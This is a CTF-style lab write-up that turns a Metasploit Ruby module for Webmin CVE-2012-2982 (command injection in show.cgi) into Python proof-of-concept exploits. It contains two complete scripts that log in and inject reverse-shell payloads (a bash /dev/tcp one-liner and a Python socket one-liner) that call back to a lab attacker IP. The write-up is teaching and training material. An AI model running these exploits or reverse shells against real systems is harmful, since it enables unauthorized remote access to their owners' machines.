---
description: >-
  Learn the importance and beginner skills of crafting custom proof of concept
  (PoC) exploit scripts from many different sources.
---

# 3 - Intro pOc Scripting

Room Link: [https://tryhackme.com/room/intropocscripting](https://tryhackme.com/room/intropocscripting)

The Ruby sourcecode we will be looking at: [https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/webapp/webmin\_show\_cgi\_exec.rb](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/webapp/webmin\_show\_cgi\_exec.rb)

## Translating the Metasploit Code

The source code can be broken up into three main functions; initialize, check and exploit. It would be most beneficial to inspect them separately.

### Initialize

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>

There are a few simple parameters to take note of in the `update_info` function that we might need to consider converting.

* `Space = 512` - maximum space in memory to store the payload
* `PayloadType = cmd` - ensures that the payload the exploit uses is the `cmd`

And the `register_options` function,

* `RPORT(10000)` - sets the target port
* `'SSL', [true, 'Use SSL', true]` - whether or not the site uses HTTPS (this didnt so set to false)
* `'USERNAME', [true, 'Webmin Username']` - accepts the username
* `'PASSWORD', [true, 'Webmin Password']` - accepts the password

#### Information to convert

* payload type: cmd or the system shell.
* placeholder for the username and password.
* RPORT: the website is on the default HTTP port 80 instead of 10000.

Other information such as memory allocation is done automatically when using python so we can ignore this. The website does not use TLS so we'll have to note this in the POST request.

### Check

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>

The purpose of this function is to verify that the target is vulnerable to CVE-2012-2982. As this function only exists to verify the vulnerability, it is expendable in our custom script. Let's breakdown this function line by line (I'll be skipping the print statements).

* `peer = "#{rhost}:#{rport}"` - reserves space for the target IP and port
* `data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"` - stores the URL that handles the login request
* `res = send_request_cgi({'method' => 'POST', 'uri' => "/session_login.cgi", 'cookie' => "testing=1", 'data' => data}, 25)` - sends an HTTP POST request to login with compromised credentials

The beginning portion of this function establishes the flow of the rest of the script:

1. sets target IP and port.
2. obtains Webmin login page URI.
3. sends a POST request to the server.

Here we simply have elements of a POST request, the login page, test cookie, and credentials. We know we need authenticated credentials in order to use this exploit, the POST request logs us in and assigns us a unique cookie to verify our local access privileges on the target and communicate as if we had a graphical interface. In fact, we can use the developer tools in our browser to verify the information.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>

We can verify the contents of the POST request, the login data _page=%2F\&user=user1\&pass=1user_ (%2F is [an equivalent](https://www.w3schools.com/tags/ref\_urlencode.ASP) of forward slash /) and the HTTP response headers.

The next section of the check function can be intimidating to beginners, but it's more simple than it appears. All this section does is format the unique cookie to exclude unnecessary text and generate a random string.

* `if res and res.code == 302 and res.get_cookies =~ /sid/` - if statement to continue if the HTTP response code is 302 and if the cookie equals the value of sid, session ID
* `session = res.get_cookies.split("sid=")[1].split(";")[0]` - formats the cookie into a readable string based on the Set-Cookie header in the HTTP response
* `command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"` - generates a random string of 5 alphanumeric characters to use as invalid input

This part has some important duties within the script. We verify that:

1. the first POST request responds with a 302 (found) status code.
2. the cookies are labeled as sid.
3. format the cookies for excess text.
4. generate the invalid input to pipe into the malicious command.

The most important information in this section is the format of the unique cookie and generating a random alphanumeric string.

#### Information to convert:

* the login page URI data (credentials and login page file).
* POST request sending the URI data.
* format the cookie.
* HTTP response code and the session id is not empty.
* generate five random characters.

The second request simply checks if the target is vulnerable to the exploit, we'll discuss this in more detail below.

### Exploit

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>

You may have noticed some similarities between the check and exploit functions, they are identical aside from the fact that the exploit function sends the actual payload. The initial POST request, formatting cookies and second request to send the payload are identical to the check function. This makes this script easier for us as we can condense redundant code.

The main difference in this exploit is the change of the _command_ variable. We can see with [`payload.encoded`](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/EncodedPayload) that instead of merely testing if the website is vulnerable, we are sending data (the shell) over a network back to our attacking machine. In order for data to be properly sent through a URL, some exploits require [URL encoding](https://www.w3schools.com/tags/ref\_urlencode.ASP). Here metasploit is using it as insurance because as we'll see in the next task, in this scenario it doesn't need to be encoded manually because the payload does not break in transit.

\
Lets discuss the second request. The module does not specify the type of request, therefore using the default GET method. It sends a request with the authenticated cookie to the file that houses the vulnerability _show.cgi_ and enters the invalid input, piping it with | to the malicious command, the system shell. As metasploit automatically establishes a socket connection between the target and attacker, we'll have include a line to open a socket on the victim in order to send the system shell back to us.

#### Information to convert

* store the system shell with a function, encode it and send it back via socket.
* send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command.

At this point we know exactly what information we need in order to convert this ruby code to python, lets review everything so far.

### Information to convert

* payload type: cmd or system shell.
* the login page URI data (credentials, receiving port and login page file).
* POST request sending the URI data.
* format the cookie.
* **verify HTTP response code and the session id is not empty**, print statement to verify success.
* generate five random characters.
* store the system shell with a function, encode it and send it back via socket.
* send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command.

At first this module may have seemed intimidating, but as we've broken down in this task it's rather simple. All it's really doing is sending a couple POST requests. While some penetration testers may want to first verify the target is vulnerable to a particular exploit, it's not always necessary if the goal is a simple and quick privilege escalation such as this example. You may sometimes find among proof of concept code that it contains unnecessary weight to what could be a simple, quick script.

## Converting Ruby into Python

﻿This exploit PoC is written in Python, but you can use your preferred language as an additional challenge. For the most part, the syntax will be relatively the same format with the POST requests, cookie formatting, and if statement. The main differences in syntax will be the random character and payload functions.

Lets review exactly what we need to convert again:

* payload type: cmd or system shell.
* **the login page URI data (credentials, receiving port and login page file)**
* **POST request sending the URI data**
* **format the cookie**
* **verify HTTP response code and the session id is not empty**, print statement to verify success.
* **generate five random alphanumeric characters**
* store the system shell with a function, encode it and send it back via socket
* send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command

Similar to the metasploit module, we can dissect our exploit into three main parts; initialize payload, login, exploit.

### Initialize Payload

The most important task here is to enable python to execute the system shell _/bin/sh_ or _/bin/bash_. Python has numerous ways to execute system programs natively but remember, we have the ability of arbitrary command execution, meaning that we can use whatever command (not just python code) necessary to establish a reverse shell including with Python, Bash, Ruby, netcat, PHP, socat and a plethora of other commands available to us.\


We can examine different examples and methods applicable to our script. You can view reverse shell examples in python and other languages/commands in the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) repository as well as [gtfobins](https://gtfobins.github.io/#+reverse%20shell) and [One-Lin3r](https://github.com/D4Vinci/One-Lin3r). I encourage you to experiment with the final script and test different reverse shells to see what does and doesn't work.\


As discussed in more detail below, the simplest way to open a connection to the attacker and send the shell will be to run a `bash` command executing a reverse shell.

Our initialization will be:

`payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`

* [x] payload type: cmd or system shell.

### Login

In some cases, especially when researching, it is necessary to check if the target is vulnerable to the exploit by sending a test command like the author of the metasploit module included. For the purposes of this room because we already confirmed the CVE, we can condense the steps to login once, return if 302 status code and return the `sid cookie` to use in the payload POST request. The request should be fairly simple and we can go down our list item by item, using the [`requests`](https://requests.readthedocs.io/en/master/user/quickstart/) library.

* **the login page URI data (credentials, receiving port and login page file)**
* **POST request sending the URI data**
* **format the cookie**
* **verify HTTP response code and the session id is not empty**, print statement to verify success

POST requests in python can send data to a server via a dictionary, list of tuples, bytes or a file object. We only need three items to send as data, the page, username, and password. From the developer tools we know the exact labels of each of these; page, user, and pass.\
`data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}`

We can include a variable with the file to target using [f-strings](https://www.geeksforgeeks.org/formatted-string-literals-f-strings-python/). We know the receiving port is the default port 80 so we don't need to include it manually.

`url = f"http://{targetIP}/session_login.cgi"`

Now we have all of the information we need to login via POST request. We'll be sending the credentials, the test cookie with its value, as well as ignoring TLS and site redirects.

`r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)`

\
Next we can include the "if statement". We can check the status code and verify the cookies aren't empty using methods from the `requests` module.

`if r.status_code == 302 and r.cookies["sid"] != None`

In the metasploit module, the manual formatting of cookies with `.split()` is necessary but this is not the case in python. While we are able to include several methods to obtain the alphanumeric cookie, we can simply read the value from the header directly with `r.cookies["sid"]`. We can assemble a quick test and see each method of formatting the cookie works.\


Our script will look like this:

{% code overflow="wrap" lineNumbers="true" %}
````python
```python
import requests

data = {'page' : "/", 'user' : "user1", 'pass' : "1user"}
url = "http://10.10.69.153/session_login.cgi"

# POST Request.
r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, 
allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
  print("[+] Login Successful, executing payload..")
else:
  print("[-] Failed to login !")

'''
other ways to extract the cookie.
c = r.cookies["sid"]
s = r.cookies['Set-Cookie'].split('=')[1].split(";")[0].strip()
'''
```
````
{% endcode %}

We've now completed the login section of our exploit.

* [x] the login page URI data (credentials, receiving port and login page file).
* [x] POST request sending the URI data.
* [x] format the cookie.
* [x] verify HTTP response code and the session id is not empty, print statement to verify success.

### Exploit

Now we've reached the main event, crafting our exploit. Let's review our needs and discuss some initial ideas to implement them.

* generate five random alphanumeric characters.
* store the system shell with a function, encode it and send it back via socket.
* send a GET or POST request with compromised cookie to `show.cgi` with invalid input piping it to the malicious command.

The exploit section of our code will also be straightforward. We will write functions to generate five random alphanumeric characters stored in a string and a payload which opens the shell via `bash` and captures the output to send via a GET or POST request.

The simplest way to execute the payload would be to replicate the original ruby program by formatting it inside of the URL. This saves space and makes the program clearer by directly piping the invalid character to the payload. In order to do this, we'll have to analyze the type of data we're dealing with. For data to be used in conjunction, it must be of the same type. Our random character and payload functions must both be strings to be formatted in the URL.

`exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"`

Using the `string` and `secrets` modules we're able to make a function that randomly prints five alphanumeric character. The strings library does not have a native alphanumeric method, so I had to combine methods representing single digits and all cases alphabet letters.

`alphaNum = string.ascii_letters + string.digits`

We can then input this variable to be randomly generated with five characters `randChar = ''.join(secrets.choice(alphaNum) for i in range(5))`

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>5</p></figcaption></figure>

And we have our invalid input function.

#### payload()

There are numerous ways to execute the system shell on Linux as we have the freedom to execute any command that we want. In this scenario we will save steps and space by using `bash` to open a connection to the attacker and send the shell. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell) lists the following examples:

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>6</p></figcaption></figure>

The first command listed `bash -i` is a popular one line command to establish an interactive reverse shell on a system. This will be the basis for our payload() function but it does require some tweaks. While it executes a reverse shell, we are missing a key point. Without specifying what to do with the bash shell that executes on boot, the system is unable to distinguish between separate processes of bash. To fix this, we can use `bash -c 'exec bash -i xyz'`

[exec](https://www.computerhope.com/unix/bash/exec.htm) completely replaces the current running process. The current shell process is destroyed and entirely replaced by the command we specify which will be the reverse shell&#x20;

`bash -i &>/dev/tcp/TARGET_IP/PORT`

I also want to discuss the meaning of "<&1", "0>&1", or "0<&1" which are interchangeable, [this article](https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean) discusses the specific command in detail. I recommend reading [this article](https://stackoverflow.com/questions/24793069/what-does-do-in-bash) and [this article](https://unix.stackexchange.com/questions/120532/what-does-exec-31-do) if the syntax is brand new to you. The purpose of "<&1" is to redirect the output stream (1, stdout) of the TCP socket to the input stream (0, stdin) of the bash shell and create a _reverse_ shell. Bash opens a TCP socket on the target machine through the given port and makes a request to the given IP (the attacker). The output stream of the socket is then redirected to the input steam of the new bash shell, sending the shell process through the socket. The ampersand character "&" acts as a reference to the I/O socket streams.

`payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`

Lastly, all we need is the second request with the authenticated cookie. The module did not specify whether to use a POST or GET method however, in this scenario either method works.

`req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)`

* [x] generate five random alphanumeric characters.
* [x] store the system shell with a function, encode it and send it back via socket.
* [x] send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command.

## 1st Final POC Python script

Using Bash to get rev shell

{% code overflow="wrap" lineNumbers="true" %}
````python
```python
import requests
import string
import secrets

data = {'page' : "/", 'user' : "user1", 'pass' : "1user"}
url = "http://10.10.69.153/session_login.cgi"

# POST Request.
r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, 
allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
  print("[+] Login Successful, executing payload..")
else:
  print("[-] Failed to login !")

sid = r.cookies["sid"]

'''
other ways to extract the cookie.
c = r.cookies["sid"]
s = r.cookies['Set-Cookie'].split('=')[1].split(";")[0].strip()
'''

# random invalid char generator function.
def rand():
  alphaNum = string.ascii_letters + string.digits
  randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
  return randChar

def payload():
  ## Attacker IP and port to listen on.
  payload = f"bash -c 'exec bash -i &>/dev/tcp/10.18.88.214/5555<&1'"
  return payload

# exploit url.
exp = f"http://10.10.69.153/file/show.cgi/bin/{rand()}|{payload()}|"

# delivering payload.
req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)
```
````
{% endcode %}

We listen with netcat on port 5555, and execute the script, then we immediately get shell :)

## 2nd Final POC Python script

Using python to get rev shell.

{% code overflow="wrap" lineNumbers="true" %}
````python
```python
import requests
import string
import secrets
from urllib.parse import quote

lhost = "10.18.88.214"
lport = "5555"
rhost = "10.10.69.153"

data = {'page' : "/", 'user' : "user1", 'pass' : "1user"}
url = f"http://{rhost}/session_login.cgi"

# POST Request.
r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, 
allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
  print("[+] Login Successful, executing payload..")
else:
  print("[-] Failed to login !")

sid = r.cookies["sid"]

'''
other ways to extract the cookie.
c = r.cookies["sid"]
s = r.cookies['Set-Cookie'].split('=')[1].split(";")[0].strip()
'''

# random invalid char generator function.
def rand():
  alphaNum = string.ascii_letters + string.digits
  randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
  return randChar

# python reverse shell payload oneliner.
def payload():
  payl= "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ lhost + "\"," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])\'"
  encodedText = quote(payl)
  return encodedText

# exploit url.
exp = f"http://10.10.69.153/file/show.cgi/bin/{rand()}|{payload()}|"

# delivering payload.
req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)
```

We get shell.
````
{% endcode %}







